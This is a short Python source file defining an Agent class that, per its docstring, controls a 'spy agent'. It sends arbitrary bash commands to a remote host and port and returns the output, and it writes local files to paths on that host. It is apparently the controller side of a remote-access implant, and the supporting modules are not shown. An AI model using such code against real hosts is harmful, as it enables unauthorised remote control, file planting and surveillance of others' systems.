from connection import Connection
from command import Command
from responce import Responce
from funCode import FunCode

"""this class is for controling 1 spy agent"""


class Agent:

    def __init__(self, host: str, port: int) -> None:
        self.host = host
        self.port = port

    def __repr__(self) -> str:
        return f"Agent(host={self.host}, port={self.port})"

    def run_bash(self, bash: str) -> tuple[Responce, str]:
        with Connection.connect(self.host, self.port) as conn:
            conn.send_command(Command(len(bash), FunCode.RUN_BASH, bash))
            return conn.recv_full_responce()

    def write_file(self, homeFilePath, targetFileName: str) -> Responce:
        with Connection.connect(self.host, self.port) as conn:

            with open(homeFilePath, "rb") as file:
                fileContent = file.read()

            conn.send_command(
                Command(len(fileContent), FunCode.WRITE_FILE, targetFileName)
            )
            conn.send_data(fileContent)
            return conn.recv_responce_struct()
